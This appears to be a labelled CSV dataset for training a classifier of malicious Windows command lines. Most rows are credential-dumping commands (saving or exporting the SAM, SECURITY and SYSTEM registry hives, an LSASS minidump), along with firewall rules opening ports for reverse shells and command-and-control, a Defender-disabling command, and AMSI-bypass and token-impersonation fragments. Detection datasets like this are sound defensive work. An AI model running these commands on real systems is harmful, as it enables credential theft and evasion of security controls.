text,label
"cmd.exe /c ""[dllimport(""advapi32.dll"")] extern bool impersonateloggedonuser(...)""",3
"cmd.exe /c ""reg save hklm\security c:\temp\8kifo9t4.dat""",1
reg export hklm\sam c:\windows\temp\x1bauf5m.save,1
reg save hklm\sam c:\windows\temp\efv0w740.save,1
"[dllimport(""advapi32.dll"")]  extern  bool  impersonateloggedonuser(...)",3
reg export hklm\sam c:\windows\temp\thl0bocl.save,1
"powershell -nop -c ""reg save hklm\security c:\temp\e7hjj5os.dat""",1
"cmd.exe /c ""powershell -nop -c ""reg save hklm\security c:\temp\973ylux9.dat""""",1
"cmd.exe /c ""reg export hklm\security c:\temp\v9o1ussx.dat""",1
"netsh  advfirewall  firewall  add  rule  name=""bad""  action=allow  protocol=any  port=4444",2
reg save hklm\system c:\windows\temp\ka12w67p.save,1
"cmd.exe /c ""reg save hklm\security c:\temp\kxisq87c.dat""",1
"powershell   -nop   -c   ""reg   export   hklm\security   c:\temp\cczu4ycn.dat""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\rrz2qk1u.dat""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\i4iu26jc.dat""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\0rt4dniz.dat""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\xfnxtvbv.dat""",1
reg save hklm\system c:\windows\temp\v949r0gf.save,1
reg export hklm\system c:\windows\temp\n1leqspy.save,1
"cmd.exe /c ""rule:   exfil   data   |   app:   any   |   dir:   outbound   |   act:   allow   |   port:   tcp   8888""",2
"cmd.exe /c ""reg export hklm\sam c:\temp\nyufz9wk.dat""",1
"powershell -nop -c ""reg save hklm\security c:\temp\3d8a15nf.dat""",1
reg export hklm\security c:\windows\temp\q69pg4jt.save,1
reg save hklm\sam c:\windows\temp\k1ndscmw.save,1
reg export hklm\sam c:\windows\temp\aiwuwmmt.save,1
reg export hklm\system c:\windows\temp\41hcn2xl.save,1
reg  export  hklm\security  c:\windows\temp\39ykb87t.save,1
reg  save  hklm\security  c:\windows\temp\7m4zgb8c.save,1
"cmd.exe /c ""reg export hklm\security c:\temp\wi79z7n6.dat""",1
reg export hklm\sam c:\windows\temp\u17499oi.save,1
"cmd.exe  /c  ""reg  save  hklm\sam  c:\temp\qv3u6zxs.dat""",1
"powershell -nop -c ""reg export hklm\security c:\temp\sdcmzndc.dat""",1
reg export hklm\sam c:\windows\temp\fhub3ee6.save,1
reg save hklm\system c:\windows\temp\ewhyzhco.save,1
"cmd.exe   /c   ""reg   export   hklm\security   c:\temp\pr11vouw.dat""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\2onw3luy.dat""",1
reg save hklm\sam c:\windows\temp\hz3fg7mm.save,1
reg   save   hklm\security   c:\windows\temp\yilckl2s.save,1
reg export hklm\sam c:\windows\temp\dkmj7bp8.save,1
reg export hklm\sam c:\windows\temp\zhtgf0zb.save,1
reg export hklm\system c:\windows\temp\4jlbf83l.save,1
"powershell  -nop  -c  ""reg  export  hklm\security  c:\temp\kiwfoi8g.dat""",1
reg export hklm\sam c:\windows\temp\okvun9sr.save,1
"cmd.exe /c ""reg save hklm\security c:\temp\6472komi.dat""",1
"powershell -nop -c ""reg save hklm\security c:\temp\srflwro8.dat""",1
reg save hklm\sam c:\windows\temp\jaanx96g.save,1
reg export hklm\security c:\windows\temp\28077bjd.save,1
reg save hklm\system c:\windows\temp\7cr3ynwb.save,1
rule:   c2   beacon   |   app:   c:\windows\temp\nc.exe   |   dir:   outbound   |   act:   allow   |   port:   tcp   8888,2
"cmd.exe /c ""reg export hklm\sam c:\temp\bcq1uaah.dat""",1
"cmd.exe   /c   ""reg   save   hklm\sam   c:\temp\kvdwo0nt.dat""",1
"powershell -nop -c ""rule: c2 beacon | app: c:\users\public\malware.exe | dir: outbound | act: allow | port: tcp 8888""",2
reg export hklm\security c:\windows\temp\wcdjijcp.save,1
reg export hklm\system c:\windows\temp\v6moaz7t.save,1
"powershell -nop -c ""set-mppreference  -disablerealtimemonitoring  $true""",2
"powershell -nop -c ""cmd.exe  /c  ""reg  export  hklm\sam  c:\temp\v5hthrph.dat""""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\voe7uq0w.dat""",1
"cmd.exe /c ""reg save hklm\security c:\temp\i66k6shl.dat""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\2otxkait.dat""",1
reg save hklm\security c:\windows\temp\o4lp3u81.save,1
"cmd.exe /c ""reg export hklm\security c:\temp\i6yzhpcz.dat""",1
reg save hklm\security c:\windows\temp\c1kk987i.save,1
reg export hklm\sam c:\windows\temp\6zpsy0kl.save,1
"powershell -nop -c ""reg export hklm\sam c:\temp\szzp2wtj.dat""",1
"cmd.exe /c ""reg export hklm\security c:\temp\09f03xdw.dat""",1
reg   export   hklm\sam   c:\windows\temp\9tfwuuos.save,1
"powershell -nop -c ""reg save hklm\sam c:\temp\u5q1j3xg.dat""",1
rule:  reverse  shell  |  app:  c:\users\public\malware.exe  |  dir:  outbound  |  act:  allow  |  port:  tcp  8888,2
"powershell -nop -c ""rule:   c2   beacon   |   app:   c:\windows\temp\nc.exe   |   dir:   outbound   |   act:   allow   |   port:   4444""",2
"cmd.exe /c ""cmd.exe   /c   ""reg   save   hklm\security   c:\temp\3m7j6nv3.dat""""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\r3nijebb.dat""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\baghj6jo.dat""",1
"cmd.exe /c ""cmd.exe   /c   ""reg   export   hklm\security   c:\temp\v097udh5.dat""""",1
reg save hklm\sam c:\windows\temp\ucn3bs0x.save,1
"cmd.exe /c ""reg export hklm\sam c:\temp\mh5w4f90.dat""",1
reg save hklm\system c:\windows\temp\v6cpt8j6.save,1
"cmd.exe /c ""rule: exfil data | app: any | dir: outbound | act: allow | port: 1337""",2
reg export hklm\system c:\windows\temp\11zgd2eu.save,1
reg export hklm\system c:\windows\temp\voy65mo9.save,1
"cmd.exe /c ""reg save hklm\sam c:\temp\j6oux4w1.dat""",1
"powershell -nop -c ""reg export hklm\security c:\temp\eu9ohiba.dat""",1
reg  save  hklm\system  c:\windows\temp\smbnq607.save,1
reg export hklm\sam c:\windows\temp\188v0qwb.save,1
reg export hklm\security c:\windows\temp\19pjxfrs.save,1
reg export hklm\system c:\windows\temp\9086hvkn.save,1
"cmd.exe   /c   ""reg   export   hklm\sam   c:\temp\xoc516qq.dat""",1
"[dllimport(""advapi32.dll"")]  extern  bool  amsiutils(...)",3
"cmd.exe /c ""reg save hklm\security c:\temp\4h006msz.dat""",1
"powershell -nop -c ""cmd.exe /c ""reg save hklm\security c:\temp\ep4x7g3d.dat""""",1
reg save hklm\system c:\windows\temp\yj8cxihn.save,1
"cmd.exe /c ""reg save hklm\sam c:\temp\pxc4ioqa.dat""",1
reg   export   hklm\security   c:\windows\temp\jr8enr8a.save,1
reg export hklm\system c:\windows\temp\8v19m3wk.save,1
reg save hklm\sam c:\windows\temp\u7cjjhdg.save,1
"cmd.exe /c ""reg export hklm\sam c:\temp\3m39juvb.dat""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\3o00ybhb.dat""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\mfw1koht.dat""",1
"cmd.exe /c ""[dllimport(""advapi32.dll"")]  extern  bool  openprocesstoken(...)""",3
reg save hklm\system c:\windows\temp\07wgfga4.save,1
"cmd.exe /c ""reg   save   hklm\sam   c:\windows\temp\7ej11soa.save""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\hn62le3p.dat""",1
"cmd.exe /c ""klist purge""",3
"powershell -nop -c ""cmd.exe /c ""reg export hklm\sam c:\temp\3y89p3mh.dat""""",1
"cmd.exe /c ""reg   export   hklm\security   c:\windows\temp\9rebyt2l.save""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\c1avk4nb.dat""",1
reg save hklm\sam c:\windows\temp\b3lxa4jy.save,1
"powershell -nop -c ""powershell  -nop  -c  ""reg  export  hklm\sam  c:\temp\vetst722.dat""""",1
"cmd.exe /c ""$a = [ref].assembly.gettype('system.management.automation.impersonateloggedonuser')""",3
"cmd.exe /c ""reg export hklm\sam c:\temp\ls4d1m6u.dat""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\3efkanwn.dat""",1
reg save hklm\sam c:\windows\temp\ib928njy.save,1
"powershell -nop -c ""cmd.exe  /c  ""reg  save  hklm\sam  c:\temp\bvcpv951.dat""""",1
"powershell   -nop   -c   ""reg   save   hklm\security   c:\temp\2o8or20l.dat""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\9kub6mvb.dat""",1
rule:   exfil   data   |   app:   c:\windows\temp\nc.exe   |   dir:   outbound   |   act:   allow   |   port:   tcp   8888,2
"cmd.exe /c ""reg save hklm\security c:\temp\m2ssux5y.dat""",1
reg save hklm\sam c:\windows\temp\pjxj0rp6.save,1
reg export hklm\system c:\windows\temp\vgj2nh97.save,1
reg save hklm\sam c:\windows\temp\4m2i2pw6.save,1
"cmd.exe /c ""reg save hklm\security c:\temp\6v24k3f0.dat""",1
"powershell -nop -c ""reg  export  hklm\security  c:\windows\temp\j6ublkvv.save""",1
reg export hklm\security c:\windows\temp\dkzgec8s.save,1
"powershell -nop -c ""reg export hklm\security c:\temp\crmap9m2.dat""",1
reg export hklm\sam c:\windows\temp\wh6irjmp.save,1
rule:  exfil  data  |  app:  c:\users\public\malware.exe  |  dir:  outbound  |  act:  allow  |  port:  tcp  8888,2
"powershell -nop -c ""reg export hklm\sam c:\temp\zf9cd74p.dat""",1
"powershell -nop -c ""reg export hklm\security c:\temp\vmablu3n.dat""",1
"powershell -nop -c ""reg save hklm\security c:\temp\7oofy6kx.dat""",1
"powershell -nop -c ""reg export hklm\security c:\temp\g1qhliu6.dat""",1
"cmd.exe /c ""[dllimport(""advapi32.dll"")]  extern  bool  amsiutils(...)""",3
"cmd.exe /c ""reg save hklm\sam c:\temp\gqkhwaqc.dat""",1
"cmd.exe  /c  ""reg  save  hklm\security  c:\temp\6e33404k.dat""",1
reg save hklm\security c:\windows\temp\qefkiir8.save,1
reg save hklm\sam c:\windows\temp\kv3kokzk.save,1
"cmd.exe /c ""reg save hklm\sam c:\temp\nlvw32q4.dat""",1
"powershell -nop -c ""powershell -nop -c ""reg save hklm\security c:\temp\reda93q0.dat""""",1
reg save hklm\security c:\windows\temp\3bq2nb68.save,1
reg export hklm\security c:\windows\temp\56i6gnmg.save,1
"powershell -nop -c ""reg save hklm\security c:\temp\illkub9j.dat""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\cjakoqxg.dat""",1
"cmd.exe /c ""reg  export  hklm\security  c:\windows\temp\eawaq7db.save""",1
java -jar application.jar,0
"cmd.exe /c ""wmic  product  get  name,  version""",0
reg save hklm\sam c:\windows\temp\vp1pugse.save,1
"powershell -nop -c ""cmd.exe /c ""reg export hklm\security c:\temp\h0fo3pvn.dat""""",1
"cmd.exe /c ""reg save hklm\security c:\temp\s6k9usyq.dat""",1
node server.js --port 3000,0
"powershell -nop -c ""reg export hklm\security c:\windows\temp\6xgu02tr.save""",1
reg export hklm\security c:\windows\temp\1s4a8boa.save,1
reg export hklm\sam c:\windows\temp\y0x4sqs0.save,1
"cmd.exe  /c  ""reg  save  hklm\sam  c:\temp\hcfcbino.dat""",1
reg export hklm\system c:\windows\temp\eylarfqn.save,1
"cmd.exe   /c   ""reg   save   hklm\security   c:\temp\psh1znbj.dat""",1
reg save hklm\security c:\windows\temp\6ovhw700.save,1
"cmd.exe /c ""powershell  -nop  -c  ""reg  save  hklm\security  c:\temp\s5vd12wk.dat""""",1
reg save hklm\security c:\windows\temp\5nhkol2j.save,1
"cmd.exe /c ""reg export hklm\security c:\temp\9vx5pmh6.dat""",1
rule: exfil data | app: c:\windows\temp\nc.exe | dir: outbound | act: allow | port: 4444,2
reg export hklm\system c:\windows\temp\odkedfve.save,1
"powershell -nop -c ""reg save hklm\security c:\temp\ckoyntbl.dat""",1
rule: exfil data | app: c:\windows\temp\nc.exe | dir: outbound | act: allow | port: tcp 8888,2
"cmd.exe  /c  ""reg  export  hklm\security  c:\temp\yxr89joe.dat""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\d6qjkhtw.dat""",1
reg export hklm\system c:\windows\temp\1b17miug.save,1
reg save hklm\security c:\windows\temp\pi89fqdh.save,1
reg export hklm\security c:\windows\temp\ap40n2rf.save,1
"powershell -nop -c ""reg  export  hklm\security  c:\windows\temp\u9v1ua20.save""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\g7hny486.dat""",1
"powershell   -nop   -c   ""reg   save   hklm\security   c:\temp\w7ntaa60.dat""",1
reg save hklm\sam c:\windows\temp\h15y7s3x.save,1
sc  query  windefend,0
"cmd.exe /c ""reg save hklm\sam c:\temp\r6x4ytwq.dat""",1
reg save hklm\security c:\windows\temp\jwpurpfi.save,1
reg export hklm\security c:\windows\temp\fcbtvdw3.save,1
reg save hklm\security c:\windows\temp\k2vbud7m.save,1
reg save hklm\system c:\windows\temp\nsbuh67s.save,1
"cmd.exe /c ""rule:  exfil  data  |  app:  any  |  dir:  outbound  |  act:  allow  |  port:  4444""",2
reg save hklm\security c:\windows\temp\9qnmognk.save,1
"powershell -nop -c ""reg save hklm\security c:\temp\wrfzei4o.dat""",1
reg export hklm\sam c:\windows\temp\5octjtg9.save,1
reg save hklm\security c:\windows\temp\1q11wwe6.save,1
"powershell -nop -c ""reg export hklm\security c:\temp\xoql95ko.dat""",1
reg save hklm\sam c:\windows\temp\svycfgqa.save,1
reg export hklm\system c:\windows\temp\ynn6hd7k.save,1
"cmd.exe /c ""reg save hklm\sam c:\temp\svag46l6.dat""",1
"powershell -nop -c ""reg  save  hklm\system  c:\windows\temp\6v8pyij1.save""",1
reg save hklm\sam c:\windows\temp\g3tzcj99.save,1
"cmd.exe /c ""reg export hklm\security c:\temp\9ndk379i.dat""",1
reg export hklm\sam c:\windows\temp\5ktmvrvx.save,1
"powershell -nop -c ""reg save hklm\security c:\windows\temp\9q4vgkmh.save""",1
reg save hklm\system c:\windows\temp\fuq8opsb.save,1
reg export hklm\security c:\windows\temp\oso73gck.save,1
reg export hklm\security c:\windows\temp\dyfqw76r.save,1
"powershell -nop -c ""reg export hklm\security c:\temp\7a7mert6.dat""",1
rule: c2 beacon | app: any | dir: outbound | act: allow | port: 1337,2
"cmd.exe /c ""reg export hklm\sam c:\temp\m7npp18x.dat""",1
"powershell -nop -c ""reg export hklm\system c:\windows\temp\4iw2l0zl.save""",1
"cmd.exe /c ""reg export hklm\security c:\temp\tg9z34mr.dat""",1
"cmd.exe /c ""cmd.exe /c ""reg save hklm\security c:\temp\p5p3m1rq.dat""""",1
"powershell -nop -c ""cmd.exe  /c  ""reg  save  hklm\sam  c:\temp\nnt70wb4.dat""""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\f5abbtsx.dat""",1
reg save hklm\security c:\windows\temp\n1k17hli.save,1
"cmd.exe /c ""reg export hklm\sam c:\temp\bgkzxuxm.dat""",1
reg save hklm\security c:\windows\temp\ntksflwv.save,1
"cmd.exe /c ""reg export hklm\security c:\temp\in7qj6ix.dat""",1
"powershell -nop -c ""reg save hklm\security c:\temp\pkuv2505.dat""",1
"powershell -nop -c ""powershell  -nop  -c  ""reg  save  hklm\sam  c:\temp\l4bec5pp.dat""""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\jkazejh0.dat""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\typ04dpc.dat""",1
"cmd.exe /c ""reg save hklm\security c:\temp\a6k02v1d.dat""",1
"powershell -nop -c ""reg export hklm\security c:\temp\3idbpk9y.dat""",1
"rundll32.exe   c:\windows\system32\comsvcs.dll,   minidump   1234   c:\temp\lsass.dmp   full",1
reg export hklm\security c:\windows\temp\6wh571j5.save,1
"cmd.exe /c ""reg  save  hklm\security  c:\windows\temp\0gwj4r0k.save""",1
"powershell -nop -c ""reg save hklm\security c:\temp\3wkemulb.dat""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\c5qevui2.dat""",1
reg save hklm\sam c:\windows\temp\g1c66ku7.save,1
reg save hklm\security c:\windows\temp\kmlxe283.save,1
"cmd.exe /c ""rundll32.exe  c:\windows\system32\comsvcs.dll,  minidump  1234  c:\temp\lsass.dmp  full""",1
"cmd.exe /c ""powershell -nop -c ""reg export hklm\security c:\temp\bualr9wu.dat""""",1
"cmd.exe /c ""rule:   reverse   shell   |   app:   any   |   dir:   outbound   |   act:   allow   |   port:   1337""",2
reg export hklm\system c:\windows\temp\dihw5keg.save,1
reg save hklm\security c:\windows\temp\gt2p5kxl.save,1
"cmd.exe /c ""reg export hklm\sam c:\temp\asjmag0c.dat""",1
reg export hklm\sam c:\windows\temp\seo7j08n.save,1
"cmd.exe /c ""reg save hklm\security c:\temp\7cy1ieiq.dat""",1
"cmd.exe /c ""reg export hklm\security c:\temp\gj8vd1t0.dat""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\xrrajrii.dat""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\lb268epr.dat""",1
reg  save  hklm\sam  c:\windows\temp\jek4qsrd.save,1
"powershell -nop -c ""reg save hklm\sam c:\temp\c1ts9zls.dat""",1
reg save hklm\system c:\windows\temp\0a7mg37k.save,1
"powershell -nop -c ""reg save hklm\sam c:\temp\1lo4mopm.dat""",1
"cmd.exe /c ""reg save hklm\security c:\temp\amohy50b.dat""",1
"cmd.exe /c ""rule: c2 beacon | app: c:\windows\temp\nc.exe | dir: outbound | act: allow | port: 4444""",2
"powershell -nop -c ""reg save hklm\security c:\temp\2x9kzisy.dat""",1
reg export hklm\system c:\windows\temp\7fx1g69o.save,1
"powershell -nop -c ""reg save hklm\security c:\temp\5s496syq.dat""",1
reg save hklm\system c:\windows\temp\78wmvr07.save,1
reg export hklm\system c:\windows\temp\261xhxai.save,1
"cmd.exe /c ""rule:   reverse   shell   |   app:   any   |   dir:   outbound   |   act:   allow   |   port:   4444""",2
reg export hklm\security c:\windows\temp\yjyl0x8d.save,1
"cmd.exe /c ""rule:  c2  beacon  |  app:  c:\windows\temp\nc.exe  |  dir:  outbound  |  act:  allow  |  port:  4444""",2
reg export hklm\sam c:\windows\temp\7i7wnyjn.save,1
reg export hklm\security c:\windows\temp\qlno0uqv.save,1
"cmd.exe /c ""reg save hklm\sam c:\temp\zy8i8iz8.dat""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\j49ey21j.dat""",1
reg save hklm\sam c:\windows\temp\os7ujxak.save,1
reg  export  hklm\system  c:\windows\temp\7oglalfs.save,1
reg save hklm\security c:\windows\temp\djjwutbx.save,1
"cmd.exe /c ""reg export hklm\security c:\temp\42nb840i.dat""",1
reg export hklm\security c:\windows\temp\m9z7ic41.save,1
"powershell -nop -c ""rule:   reverse   shell   |   app:   c:\windows\temp\nc.exe   |   dir:   outbound   |   act:   allow   |   port:   4444""",2
"powershell -nop -c ""reg save hklm\sam c:\temp\txom5z5x.dat""",1
reg export hklm\security c:\windows\temp\c7tvvtto.save,1
reg export hklm\sam c:\windows\temp\ijnyh1k6.save,1
"cmd.exe /c ""reg save hklm\security c:\temp\1ss8h84x.dat""",1
reg export hklm\system c:\windows\temp\174mp1cu.save,1
"cmd.exe /c ""reg export hklm\security c:\temp\196jl1e0.dat""",1
reg save hklm\system c:\windows\temp\hyf6d05a.save,1
"powershell -nop -c ""reg save hklm\security c:\temp\34bdkhhz.dat""",1
"cmd.exe /c ""reg  export  hklm\sam  c:\windows\temp\gf6j35lk.save""",1
reg save hklm\security c:\windows\temp\o5bd8dg3.save,1
reg export hklm\security c:\windows\temp\jacs7030.save,1
"cmd.exe /c ""cmd.exe  /c  ""reg  save  hklm\security  c:\temp\oskeckp2.dat""""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\ykc89ymw.dat""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\ti2swcce.dat""",1
"cmd.exe /c ""cmd.exe  /c  ""reg  save  hklm\sam  c:\temp\4a67qfbs.dat""""",1
reg save hklm\security c:\windows\temp\kjmtfyl1.save,1
"cmd.exe /c ""reg export hklm\security c:\temp\0gn93fkk.dat""",1
reg export hklm\security c:\windows\temp\lad106c0.save,1
"cmd.exe /c ""reg export hklm\security c:\temp\01iho00i.dat""",1
reg  export  hklm\system  c:\windows\temp\0bjdnly1.save,1
"powershell -nop -c ""reg save hklm\sam c:\temp\t4f5063k.dat""",1
reg export hklm\security c:\windows\temp\qepjd3fw.save,1
"cmd.exe /c ""rule: c2 beacon | app: c:\users\public\malware.exe | dir: outbound | act: allow | port: 4444""",2
"powershell -nop -c ""rule:   reverse   shell   |   app:   c:\users\public\malware.exe   |   dir:   outbound   |   act:   allow   |   port:   tcp   8888""",2
rule: c2 beacon | app: c:\windows\temp\nc.exe | dir: outbound | act: allow | port: tcp 8888,2
"cmd.exe /c ""reg save hklm\security c:\temp\p8ei9c2k.dat""",1
"cmd.exe /c ""rule:  exfil  data  |  app:  c:\users\public\malware.exe  |  dir:  outbound  |  act:  allow  |  port:  4444""",2
reg export hklm\system c:\windows\temp\12sa4yuo.save,1
"cmd.exe /c ""cmd.exe   /c   ""reg   export   hklm\security   c:\temp\0cqbln9s.dat""""",1
"cmd.exe /c ""reg export hklm\system c:\windows\temp\lenm2wie.save""",1
"powershell -nop -c ""rule:   reverse   shell   |   app:   c:\windows\temp\nc.exe   |   dir:   outbound   |   act:   allow   |   port:   tcp   8888""",2
"powershell -nop -c ""reg save hklm\security c:\temp\lisdhfxt.dat""",1
reg export hklm\sam c:\windows\temp\4gva9xp4.save,1
reg export hklm\security c:\windows\temp\z8m91r3h.save,1
reg  save  hklm\sam  c:\windows\temp\x1o56zgi.save,1
reg save hklm\security c:\windows\temp\ut9ch2tq.save,1
"powershell -nop -c ""reg export hklm\sam c:\temp\844yxs3a.dat""",1
